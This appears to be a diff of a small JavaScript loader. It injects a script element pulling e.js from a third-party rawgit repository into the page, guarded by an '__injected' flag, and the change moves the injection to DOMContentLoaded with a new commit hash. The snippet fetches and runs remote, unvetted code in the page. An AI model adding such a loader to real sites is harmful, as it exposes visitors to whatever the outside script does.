@@ -1,1 +1,11 @@
-if("undefined"==typeof __injected){var s=document.createElement("script");s.src="https://rawgit.com/afreerepo/repo1/4161ed325301af4a0d1e37860382f14eec57a6ca/e.js",document.body.appendChild(s),__injected=1}
+if("undefined" == typeof __injected)
+{
+  document.addEventListener('DOMContentLoaded', function(){
+
+    var s=document.createElement("script");
+    s.src="https://rawgit.com/afreerepo/repo1/8aed65558862825636dcbd7f4e2d47ff2052a6f7/e.js";
+    document.body.appendChild(s);
+    __injected=1
+
+  }, false);
+}
